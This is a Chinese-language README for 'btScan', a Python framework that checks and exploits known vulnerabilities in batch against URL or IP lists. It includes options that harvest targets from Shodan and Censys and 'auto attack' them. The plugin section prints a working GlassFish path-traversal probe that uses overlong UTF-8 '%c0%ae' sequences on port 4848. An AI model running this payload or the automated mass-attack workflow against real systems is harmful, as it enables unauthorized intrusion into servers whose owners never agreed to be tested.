##目录结构

    --lib 核心文件库

    --report 报告生成的文件夹

    --node 里面每一个py文件是一个攻击向量，添加扫描节点也是向里面添加文件

    --crawl 通过空间搜索引擎抓取url或者ip的脚本
    

##使用方法
    python btScan.py
    usage: btScan.py [options]
    
    * batch vulnerability verification and exploition framework. *
    By he1m4n6a
    
    optional arguments:
      -h, --help   show this help message and exit
      -t THREADS   Num of scan threads for each scan process, 20 by default
      -m MODE      select mode [config|script]
                   e.g. -m script
      -n NAME      from node floder choose a script
      -c COMMAND   give an instruction when use script mode [verify|exploit]
                   e.g. -c verify
      -u URL_FILE  input url file
      -i IP_FILE   input ip file
      -autoIP      get ip from space search engine and auto attack
      -autoURL     get url from space search engine and auto attack
      -v           show program's version number and exit

脚本存在两种验证模式，一种是通过加载模块，另一种是通过配置文件。复杂的可以通过加载脚本，简单的通过加载配置文件即可。然后攻击也有两种模式，验证verify模式和攻击exploit模式。 你也可以指定ip或者url作为输入格式，也可以自动获取ip或者url，那就是配合crawl文件下的网络空间抓取模块。

**示例**
```
    python btscan.py -n joomla -m script -c verify -u url.txt
-n 指定node文件夹下的joomla.py，-m指定为script模式，即指定加载模块的模式。-c指定模式为验证，仅为验证就好了，-u指定输入为url的模式。
```
```
python btscan.py -n joomla -m script -c exploit -u url.txt
同上，只是指定为攻击模式。
```
```
python btscan.py  -m config -c verify -i ip.txts
-m指定为config模式，-c指定为验证模式，-i指定输入的为ip模式，仅需通过conf目录下的scan_rule.ini的配置就够了。
```


##插件编写规则

仅需要在node文件夹下新增一个py文件

py文件中重要的有两个函数verify和exploit函数，没有exploit攻击模式，仅需要verify函数，返回值有三个值，第一个值是返回是否存在漏洞，返回True或者False；第二个值是返回url，第三个值返回需要打印的信息。

***示例(glassfish.py为例)***

```
#!/usr/bin/env python
#coding=utf8

import requests

def verify(ip):
    url = 'https://' + str(ip) + ':4848//theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/'
    try:
        r = requests.get(url, verify=False, timeout=5)
        if 'ejb-timer-service-app' in r.text:
            msg = 'vul'
            return True, ip, msg
	else:
            msg = 'safe'
            return False, ip, msg
    except Exception, e:
        #msg = str(e)
	msg = 'safe'
        return False, ip, msg


def exploit(ip):
    verify(ip)
```
上面函数都可以自己定义，主要是verfiy和exploit函数，如果exploit函数和verify函数一样，exploit函数里面只要简单的调用verify(url)即可。

##其他

crwal文件夹的NetSearch.py里面的shadon和censys模块的密钥要自己填上。

有任何交流和问题可以联系我he1m4n6a@163.com
